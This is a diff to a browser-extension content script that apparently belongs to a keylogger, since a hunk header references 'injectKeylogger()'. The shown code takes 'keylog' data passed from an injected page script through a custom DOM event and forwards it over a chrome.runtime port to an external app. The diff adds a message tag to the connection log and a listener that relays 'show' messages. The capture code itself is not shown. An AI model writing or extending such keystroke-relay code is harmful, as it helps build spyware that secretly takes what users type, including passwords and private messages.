@@ -33,12 +33,12 @@ document.onload = injectKeylogger();
 // the event will try to understand if connection already exists
 var port = null;
 
-function connectExternalApp() {
+function connectExternalApp(msg) {
     if (!port) { 
         port = chrome.runtime.connect(__appID.app);
         port.postMessage({
            protocol: "log",
-           content: "[" + __time() + " :: EXT] Establishing Connection. If you see this message the connection is established"
+           content: "[" + __time() + " :: EXT] Establishing Connection. If you see this message the connection is established :: " + (msg ? msg : "not_defined")
         });
         // null the port when connection disconnects
         port.onDisconnect.addListener(function() {
@@ -54,12 +54,19 @@ document.addEventListener(__config.dispatchID, function(e) {
     // keylog is an abject that contains all the logging informations
     // passed from the injected script
     keylog = e.detail;
-    //__printDebug(keylog);
     
-    connectExternalApp();
+    connectExternalApp("event");
     port.postMessage({
         protocol: "event",
         content: keylog
     })
     
 });
+
+chrome.runtime.onMessage.addListener( function(msg) {
+    if (msg.protocol === "show") {
+        connectExternalApp("show");
+        port.postMessage(msg);
+    }
+})
+
